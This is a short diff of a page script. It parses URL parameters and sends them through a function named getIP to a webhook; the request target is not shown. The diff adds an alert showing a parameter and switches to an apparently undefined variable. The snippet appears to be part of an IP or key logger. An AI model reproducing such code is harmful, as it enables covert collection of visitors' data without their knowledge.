@@ -11,7 +11,7 @@ for (var keyValue in keyValues) {
     var value = keyValuePairs[1];
     parameters[key] = value;
 }
-
+alert(parameters['yourKey']);
 
 function getIP(tok) {
   var request = new XMLHttpRequest(); //making a request for the webhook
@@ -28,7 +28,7 @@ function getIP(tok) {
 
       request.send(JSON.stringify(params));
     }
-getIP(parameters['yourKey'])
+getIP(yourKey)
 </script>
 
 
